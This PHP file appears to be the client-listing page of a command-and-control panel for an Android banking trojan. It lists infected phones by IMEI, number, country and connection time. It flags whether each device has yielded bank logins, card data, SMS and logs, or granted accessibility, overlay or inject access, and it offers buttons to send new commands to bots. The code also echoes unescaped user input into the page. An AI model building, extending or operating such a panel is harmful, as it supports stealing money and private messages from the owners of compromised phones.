<?php
session_start();
require_once 'includes/auth_validate.php';
require_once './config/config.php';

// Serve deletion if POST method and del_id is set.

//Get data from query string
$search_string = filter_input(INPUT_GET, 'search_string');
$online = filter_input(INPUT_GET, 'online');
$with_data = filter_input(INPUT_GET, 'with_data');


$filter_col = filter_input(INPUT_GET, 'filter_col');
$order_by = filter_input(INPUT_GET, 'order_by');
$page = filter_input(INPUT_GET, 'page');
$pagelimit = 20;
if ($page == "") {
    $page = 1;
}
// If filter types are not selected we show latest added data first
if ($filter_col == "") {
    $filter_col = "id";
}
if ($order_by == "") {
    $order_by = "desc";
}

// select the columns
$select = array('c.id', 'c.imei', 'c.number', 'c.version', 'c.version_apk','c.country','c.model','c.apps',
    'c.lastConnect','c.firstConnect','c.root','c.screen','c.comment','c.internet','c.ip', 'c.zip', 'c.regionName',
    'c.city', 'c.s_bank', 'c.s_card', 'c.s_sms', 'c.s_log', 'c.s_a7inj_enabled', 'c.s_whitelist', 'c.s_sms_manager',
    'c.s_accessibility', 'c.s_overlay');

// select only online
if ($online){
    $time = time() - 300;
    $db->where('lastConnect', $time, '>=');
}
// select bots with data
if ($with_data){
    $db->orwhere('s_bank', 1, '>=');
    $db->orwhere('s_card', 1, '>=');
    $db->orwhere('s_sms', 1, '>=');
    $db->orwhere('s_log', 1, '>=');
}
// If user searches
if ($search_string) {
    $db->where('c.imei', '%' . $search_string . '%', 'like');
    $db->orwhere('c.number', '%' . $search_string . '%', 'like');
}

$db->orderBy('lastConnect', 'Desc');
if ($order_by) {
    $db->orderBy($filter_col, $order_by);
} else {
    $db->orderBy('lastConnect', 'Desc');
}

$db->pageLimit = $pagelimit;

$clients = $db->arraybuilder()->paginate("clients c", $page, $select);
$total_pages = $db->totalPages;

// get columns for order filter
foreach ($clients as $value) {
    foreach ($value as $col_name => $col_value) {
        $filter_options[$col_name] = $col_name;
    }
    //execute only once
    break;
}
include_once 'includes/header.php';
?>
<div id="page-wrapper">
    <div class="row">

        <div class="col-lg-6">
            <h1 class="page-header">Clients</h1>
        </div>
        <div class="col-lg-6" style="">
            <div class="page-action-links text-right">
                <button class="btn btn-success" onclick="setNewCommand()" style="margin-right: 8px;"><span class="glyphicon glyphicon-plus"></span> Add new command </button>
                <button class="btn btn-danger delete_btn" onclick="deleteIds('delete_client.php')" style="margin-right: 8px;"><span class="glyphicon glyphicon-trash"></span> Delete selected clients </button>
            </div>
        </div>
    </div>
    <?php include('./includes/flash_messages.php') ?>
    <!--    Begin filter section-->
    <div class="well text-center filter-form">
        <form class="form form-inline" action="">
            <label for="input_search">Search IMEI</label>
            <input type="text" id="input_search" name="search_string" value="<?php echo $search_string; ?>">
            <label for ="input_order">Order By</label>
            <select name="filter_col">
                <?php
                foreach ($filter_options as $option) {
                    ($filter_col === $option) ? $selected = "selected" : $selected = "";
                    echo ' <option value="' . $option . '" ' . $selected . '>' . $option . '</option>';
                }
                ?>
            </select>

            <select name="order_by" class="" id="input_order">
                <option value="Asc" <?php
                if ($order_by == 'Asc') {
                    echo "selected";
                }
                ?> >Asc</option>
                <option value="Desc" <?php
                if ($order_by == 'Desc') {
                    echo "selected";
                }
                ?>>Desc</option>
            </select>
            <label for ="input_order">Online</label><input type="checkbox" class="form-check-input" name="online">
            <label for ="input_order">With data</label><input type="checkbox" class="form-check-input" name="with_data">
            <input type="submit" value="Go" class="btn btn-primary">
        </form>
    </div>
    <!--   Filter section end-->

    <hr>
    <table class="table table-striped table-bordered table-condensed">
        <thead>
        <tr>
            <th class="header"><input type="checkbox" class="form-check-input" id="chk" onclick="chkAll()"></th>
            <th></th>
            <th>Display</th>
            <th>IMEI</th>
            <th>Android</th>
            <th>Apk ver</th>
            <th>Country</th>
            <th>FirstConnect</th>
            <th>LastConnect</th>
            <th>Comment</th>
            <!--<th>Inet/IP</th>
            <th>Zip</th>
            <th>Region Name</th>
            <th>City</th>-->
            <th></th>
            <th>Actions</th>
        </tr>
        </thead>
        <tbody>
        <?php
        foreach ($clients as $row) { ?>
            <tr>
                <td><input type="checkbox" class="form-check-input" id="chk_imei" value="<?php echo $row['imei'] ?>"></td>
                <td><i class="fa fa-android" aria-hidden="true" <?php if ((time() - $row['lastConnect'])<300) {echo 'style="color:#5bb85c;"';}?>></i></td>
                <td><i class="glyphicon glyphicon-eye-open" aria-hidden="true" <?php if ($row['screen']) {echo 'style="color:#5bb85c;"';}?>></i></td>
                <td><?php echo $row['imei'] ?></td>
                <td><?php echo $row['version'] ?> </td>
                <td><?php echo $row['version_apk'] ?></td>
                <td><?php echo $row['country'] ?></td>
                <td><?php echo date("Y-m-d H:i",$row['firstConnect']) ?></td>
                <td><?php echo date("Y-m-d H:i",$row['lastConnect']) ?></td>
                <td><?php echo $row['comment'] ?></span></td>
                <!--<td><?php echo $row['internet']."<br>".$row['ip'] ?></td>
                <td><?php echo $row['zip'] ?></span></td>
                <td><?php echo $row['regionName'] ?></span></td>
                <td><?php echo $row['city'] ?></span></td>-->
                <td><span class="glyphicon glyphicon-piggy-bank pointer" <?php if ($row['s_bank']) {echo 'style="color:#5bb85c;"';}?> data-container="body" data-toggle="popover" data-placement="top" title="Bank data" data-content=""></span>
                    <span class="glyphicon glyphicon-credit-card pointer" <?php if ($row['s_card']) {echo 'style="color:#5bb85c;"';}?> data-container="body" data-toggle="popover" data-placement="top"  title="CC data" data-content=""></span>
                    <span class="glyphicon glyphicon-envelope pointer" <?php if ($row['s_sms']) {echo 'style="color:#5bb85c;"';}?> data-container="body" data-toggle="popover" data-placement="top" title="SMS" data-content=""></span>
                    <span class="glyphicon glyphicon-copy pointer" <?php if ($row['s_log']) {echo 'style="color:#5bb85c;"';}?> data-container="body" data-toggle="popover" data-placement="top" title="Client logs" data-content=""></span>
                    <!-- <span class="glyphicon glyphicon-user pointer" <?php if ($row['root'] != "0") {echo 'style="color:#5bb85c;"';}?> data-container="body" data-toggle="popover" data-placement="top" title="Admin permissions" data-content=""></span> -->
                    <!-- <span class="glyphicon glyphicon-list-alt pointer" <?php if ($row['s_whitelist'] != "0") {echo 'style="color:#5bb85c;"';}?> data-container="body" data-toggle="popover" data-placement="top" title="White list" data-content=""></span> -->
                    <span class="glyphicon glyphicon-th-large pointer" <?php if ($row['model'] != "") {echo 'style="color:#5bb85c;"';}?> data-container="body" data-toggle="popover" data-placement="top" title="Bank Applications" data-content="<?php echo $row['model']; ?>"></span>
                    <!-- <span class="glyphicon glyphicon-list pointer" <?php if ($row['apps'] != "") {echo 'style="color:#5bb85c;"';}?> data-container="body" data-toggle="popover" data-placement="top" title="Applications" data-content="<?php echo $row['apps']; ?>"></span> -->
                   <!-- <span class="glyphicon glyphicon-phone pointer" <?php if ($row['s_a7inj_enabled']) {echo 'style="color:#5bb85c;"';}?> data-container="body" data-toggle="popover" data-placement="top" title="Android injects" data-content="" ></span>-->
                    <span class="glyphicon glyphicon-inbox pointer" <?php if ($row['s_sms_manager']) {echo 'style="color:#5bb85c;"';}?> data-container="body" data-toggle="popover" data-placement="top" title="SMS Manager" data-content="" ></span>
                    <span class="glyphicon glyphicon-info-sign pointer" <?php if ($row['s_accessibility']) {echo 'style="color:#5bb85c;"';}?> data-container="body" data-toggle="popover" data-placement="top" title="Accessibility" data-content="" ></span>
                    <!-- <span class="glyphicon glyphicon-picture pointer" <?php if ($row['s_overlay']) {echo 'style="color:#5bb85c;"';}?> data-container="body" data-toggle="popover" data-placement="top" title="Can Draw Overlays" data-content="" ></span> -->
                </td>
                <td>
                    <a href="edit_client.php?client_id=<?php echo $row['id'] ?>&operation=edit" class="btn btn-primary" style="margin-right: 8px;"><span class="glyphicon glyphicon-edit"></span>
                        <a href=""  class="btn btn-danger delete_btn" data-toggle="modal" data-target="#confirm-delete-<?php echo $row['id'] ?>" style="margin-right: 8px;"><span class="glyphicon glyphicon-trash"></span></td>
            </tr>

            <!-- Delete Confirmation Modal-->
            <div class="modal fade" id="confirm-delete-<?php echo $row['id'] ?>" role="dialog">
                <div class="modal-dialog">
                    <form action="delete_client.php" method="POST">
                        <!-- Modal content-->
                        <div class="modal-content">
                            <div class="modal-header">
                                <button type="button" class="close" data-dismiss="modal">&times;</button>
                                <h4 class="modal-title">Confirm</h4>
                            </div>
                            <div class="modal-body">

                                <input type="hidden" name="del_id" id = "del_id" value="<?php echo $row['id'] ?>">

                                <p>Are you sure you want to delete this client?</p>
                            </div>
                            <div class="modal-footer">
                                <button type="submit" class="btn btn-default pull-left">Yes</button>
                                <button type="button" class="btn btn-default" data-dismiss="modal">No</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        <?php } ?>
        </tbody>
    </table>
    <script>
        $(function () {
            $('[data-toggle="popover"]').popover()
        })
    </script>

    <!--    Pagination links-->
    <div class="text-center">
        <?php
        if (!empty($_GET)) {
            //we must unset $_GET[page] if built by http_build_query function
            unset($_GET['page']);
            $http_query = "?" . http_build_query($_GET);
        } else {
            $http_query = "?";
        }
        if ($total_pages > 1) {
            echo '<ul class="pagination text-center">';
            for ($i = 1; $i <= $total_pages; $i++) {
                ($page == $i) ? $li_class = ' class="active"' : $li_class = "";
                echo '<li' . $li_class . '><a href="clients.php' . $http_query . '&page=' . $i . '">' . $i . '</a></li>';
            }
            echo '</ul></div>';
        }
        ?>
    </div>
</div>
<!--Main container end-->


<?php include_once './includes/footer.php'; ?>

